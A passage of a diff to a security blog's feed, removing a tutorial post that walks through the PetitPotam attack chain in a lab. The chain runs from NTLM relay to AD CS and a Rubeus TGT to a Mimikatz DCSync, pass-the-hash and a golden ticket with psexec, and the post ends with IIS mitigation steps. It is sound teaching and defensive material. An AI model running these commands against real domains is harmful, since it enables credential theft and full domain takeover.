+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="https://omnisl4sh.github.io/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/07/APT</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2998,169 +3474,4 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/print-ops-and-load-driver.jpg" alt="print-ops-and-load-driver" /></p>
 
-<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - PetitPotam</title><link href="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - PetitPotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/28/PetitPotam</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>
-
-<p><img src="/assets/petitpotam/Petit-Potam-Flow-Diagram.jpg" alt="Petit-Potam-Flow-Diagram" /></p>
-
-<ul>
-  <li>The <strong>PetitPotam attack</strong> is a technique where we abuse the <strong>printer bug</strong> (Explained here: https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug) to make a <strong>domain controller</strong> authenticate to our <strong>kali machine</strong>.</li>
-  <li><em>Relaying the captured authentication</em> to the <strong>web interface of AD Certificate services (ADCS)</strong> allows us to get the <strong>certificate of the domain controller’s computer account</strong>.</li>
-  <li><em>Having this certificate</em> can let us <strong>request a TGT for the computer account</strong>.</li>
-  <li><em>And, with a TGT of a Domain Controller’s machine account,</em> we can abuse its <strong>DCSync</strong> right on the domain to retrieve <strong>a full dump containing all domain users’ NTLM hashes</strong>.</li>
-  <li><em>Having all user hashes and using them with a simple Pass-the-Hash attack,</em> we can obtain <strong>code execution as a Domain Admin</strong>.</li>
-  <li><strong>Persistence</strong> can also be established with a <strong>Golden Ticket</strong> since the <code class="language-plaintext highlighter-rouge">krbtgt</code> account hash would be obtainable.</li>
-</ul>
-
-<hr />
-
-<h1 id="tools-needed">Tools needed</h1>
-<ol>
-  <li><strong>Impacket</strong> (https://github.com/SecureAuthCorp/impacket)</li>
-  <li><strong>PetitPotam</strong> (https://github.com/topotam/PetitPotam)</li>
-  <li><strong>Rubeus</strong> (https://github.com/GhostPack/Rubeus)</li>
-  <li><strong>Mimikatz</strong> (https://github.com/gentilkiwi/mimikatz)</li>
-</ol>
-
-<hr />
-
-<h1 id="lab-setup-and-conditions">Lab Setup and Conditions</h1>
-<h2 id="1-dclablocal-192168126129">1. DC.lab.local (192.168.126.129)</h2>
-<p>A Domain Controller with <strong>Active Directory Certificate Services Web Enrollment</strong> enabled</p>
-
-<p><img src="/assets/petitpotam/Domain-Controllers.jpg" alt="Domain-Controllers" /></p>
-
-<p><img src="/assets/petitpotam/AD-CS-Installed.jpg" alt="AD-CS-Installed" /></p>
-
-<h2 id="2-dc2lablocal-192168126130">2. DC2.lab.local (192.168.126.130)</h2>
-<p>Another Domain Controller (<em>PrintSpooler Service must be running to quickly force authentication.</em>)</p>
-
-<p><img src="/assets/petitpotam/Spooler-Running.jpg" alt="Spooler-Running" /></p>
-
-<h2 id="3-kali-machine-192168126132">3. Kali Machine (192.168.126.132)</h2>
-<p>for triggering authentication and relaying to ADCS Web UI.</p>
-
-<p><img src="/assets/petitpotam/kali-ip-config.jpg" alt="kali-ip-config" /></p>
-
-<h2 id="4-windows-machine-192168126128">4. Windows Machine (192.168.126.128)</h2>
-<p>for requesting a TGT and doing the DCSync attack (The machine shouldn’t be in the domain, but should have the Domain Controller set as its primary DNS server).</p>
-
-<p><img src="/assets/petitpotam/Windows-Attacker-ipconfig.jpg" alt="Windows-Attacker-ipconfig" /></p>
-
-<h2 id="5-normal-user-account-labjohnsmith">5. normal user account (Lab\JohnSmith)</h2>
-<p>A regular domain user with no special privileges.</p>
-
-<p><img src="/assets/petitpotam/John-Smith-User.jpg" alt="John-Smith-User" /></p>
-
-<hr />
-
-<h1 id="steps-to-create">Steps to Create</h1>
-<h2 id="1-set-up-ntlm-relay-on-our-attacker-host-to-forward-the-captured-authentication-to-adcs-web-ui">1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py <span class="nt">-t</span> http://&lt;CA_Server&gt;/certsrv/certfnsh.asp <span class="nt">-smb2support</span> <span class="nt">--adcs</span> <span class="nt">--template</span> DomainController
-</code></pre></div></div>
-
-<p><img src="/assets/petitpotam/ntlm-relay-start.jpg" alt="ntlm-relay-start" /></p>
-
-<h2 id="2-use-petitpotam-to-force-authentication-from-a-domain-controller-back-to-the-relaying-kali-machine">2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PetitPotam.py <span class="nt">-d</span> &lt;DOMAIN_FQDN&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; &lt;KALI&gt; &lt;TARGET_DC&gt;
-</code></pre></div></div>
-
-<p><img src="/assets/petitpotam/PetitPotam-Launched.jpg" alt="PetitPotam-Launched" /></p>
-
-<h2 id="3-recieve-the-base64-certificate-for-the-domain-controllers-computer-account">3. Recieve the Base64 certificate for the domain controller’s computer account</h2>
-
-<p><img src="/assets/petitpotam/got-dc2-cert.jpg" alt="got-dc2-cert" /></p>
-
-<h2 id="4-use-rubeus-on-the-windows-machine-to-request-a-tgt-for-that-account-using-the-certificate">4. Use Rubeus on the windows machine to request a TGT for that account using the certificate</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asktgt /outfile:kirbi /dc:&lt;DOMAINCONTROLLER&gt; /domain:&lt;DOMAIN_FQDN&gt; /user:&lt;CAPTURED_DC_COMPUTER_ACCOUNT_NAME&gt; /ptt /certificate:&lt;CAPTURED_BASE64_CERTIFICATE&gt;
-</code></pre></div></div>
-
-<p><img src="/assets/petitpotam/rubeus-command.jpg" alt="rubeus-command" /></p>
-
-<p><img src="/assets/petitpotam/got-dc2-tgt.jpg" alt="got-dc2-tgt" /></p>
-
-<h2 id="5-having-the-tgt-in-memory-use-mimikatz-to-do-a-dcsync-attack">5. <em>Having the TGT in memory,</em> use Mimikatz to do a DCSync attack</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcsync /domain:&lt;DOMAINFQDN&gt; /user:&lt;TARGET_USER&gt;
-</code></pre></div></div>
-
-<p><img src="/assets/petitpotam/dcsync-for-domain-admin-hash.jpg" alt="dcsync-for-domain-admin-hash" /></p>
-
-<h2 id="6-grab-any-domain-admins-hash-to-have-code-execution">6. Grab any domain admin’s hash to have code execution</h2>
-
-<p><img src="/assets/petitpotam/code-execution-as-administrator.jpg" alt="code-execution-as-administrator" /></p>
-
-<h2 id="7-optional-create-a-golden-ticket-for-persistence">7. (Optional) Create a Golden Ticket for persistence</h2>
-<p>Domain SID Lookup:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lookupsid.py &lt;DOMAIN_FQDN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt;
-</code></pre></div></div>
-
-<p><img src="/assets/petitpotam/domain-sid-lookup.jpg" alt="domain-sid-lookup" /></p>
-
-<p>Obtaining the <code class="language-plaintext highlighter-rouge">krbtgt</code> account’s hash:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcsync /domain:&lt;DOMAIN_FQDN&gt; /user:krbtgt
-</code></pre></div></div>
-
-<p><img src="/assets/petitpotam/krbtgt-hash.jpg" alt="krbtgt-hash" /></p>
-
-<p>Golden ticket creation:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ticketer.py <span class="nt">-nthash</span> &lt;KRBTGT_HASH&gt; <span class="nt">-domain-sid</span> &lt;DOMAIN_SID&gt; <span class="nt">-domain</span> &lt;DOMAIN_FQDN&gt; &lt;CAN_BE_NON_EXISTING_USERNAME&gt;
-</code></pre></div></div>
-
-<p><img src="/assets/petitpotam/golden-ticket-created.jpg" alt="golden-ticket-created" /></p>
-
-<p>Exporting ticket to the environment:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/&lt;CHOSEN_USERNAME&gt;.ccache
-</code></pre></div></div>
-
-<p>Command execution using ticket:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;DOMAIN_FQDN&gt;/&lt;CHOSEN_USERNAME&gt;@&lt;DC_FQDN&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
-</code></pre></div></div>
-
-<p><img src="/assets/petitpotam/golden-ticket-used.jpg" alt="golden-ticket-used" /></p>
-
-<hr />
-
-<h1 id="mitigation">Mitigation:</h1>
-<h2 id="1-enable-epa-for-certificate-authority-web-enrollment">1. Enable EPA for Certificate Authority Web Enrollment</h2>
-<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; CertSrv -&gt; Authentication -&gt; Windows Authentication -&gt; Right-click -&gt; Advanced Settings -&gt; Extended Protection: Required</p>
-
-<p><img src="/assets/petitpotam/certsrv-epa-required.jpg" alt="certsrv-epa-required" /></p>
-
-<h2 id="2-enable-epa-for-certificate-enrollment-web-service">2. Enable EPA for Certificate Enrollment Web Service</h2>
-<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; <CA_NAME>\_CES\_Kerberos -&gt; Authentication -&gt; Windows Authentication -&gt; Right-click -&gt; Advanced Settings -&gt; Extended Protection: Required</CA_NAME></p>
-
-<p><img src="/assets/petitpotam/certentrollwebsvc-epa-required.jpg" alt="certentrollwebsvc-epa-required" /></p>
-
-<p>After enabling EPA in the UI, the <code class="language-plaintext highlighter-rouge">Web.config</code> file created by CES role at <code class="language-plaintext highlighter-rouge">&lt;%windir%&gt;\systemdata\CES\&lt;CA Name&gt;_CES_Kerberos\web.config</code> should also be updated by adding <code class="language-plaintext highlighter-rouge">&lt;extendedProtectionPolicy&gt;</code> set with a value of <code class="language-plaintext highlighter-rouge">Always</code></p>
-
-<p><img src="/assets/petitpotam/web-config-editing.jpg" alt="web-config-editing" /></p>
-
-<h2 id="3-enable-require-ssl-which-will-enable-only-https-connections">3. Enable Require SSL, which will enable only HTTPS connections.</h2>
-<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; CertSrv -&gt; SSL Settings -&gt; Require SSL</p>
-
-<p><img src="/assets/petitpotam/cert-srv-require-ssl.jpg" alt="cert-srv-require-ssl" /></p>
-
-<h2 id="4-restart-iis">4. Restart IIS</h2>
-<p><em>From an elevated command prompt,</em> type:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iisreset /restart
-</code></pre></div></div>
-
-<hr />
-
-<h1 id="conclusion">Conclusion</h1>
-<p>Having a non-secure AD CS Installation in a domain can present an attacker with an easy way to achieve Domain Admin privileges and gain Persistence.
-Luckily enough, with some simple mitigation steps, this can be resolved.</p>
-
-<hr />
-
-<h1 id="credits">Credits</h1>
-<ol>
-  <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote this excellent paper (https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)</li>
-  <li><strong>Lionel Gilles</strong> for creating the <strong>PetitPotam</strong> Python Script</li>
-  <li><strong>Yang Zhang</strong> of Back2Zero team &amp; <strong>Yongtao Wang</strong> (@Sanr) of BCM Social Corp, <strong>Eyal Karni, Marina Simakov and Yaron Zinar</strong> from Preempt &amp; <strong>n1nty</strong> from A-TEAM of Legendsec at Qi’anxin Group for the <strong>PrinterBug</strong> (CVE-2019-1040)</li>
-  <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts</li>
-  <li><strong>Benjamin Delpy</strong> for the legendary <strong>mimikatz</strong></li>
-  <li><strong>GhostPack</strong> for the <strong>Rubeus</strong> tool</li>
-  <li><strong>Harshit Rajpal</strong> for the amazing article explaining the attack (https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)</li>
-  <li><strong>Microsoft Support</strong> for the mitigation guide (https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)</li>
-</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry></feed>
+<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
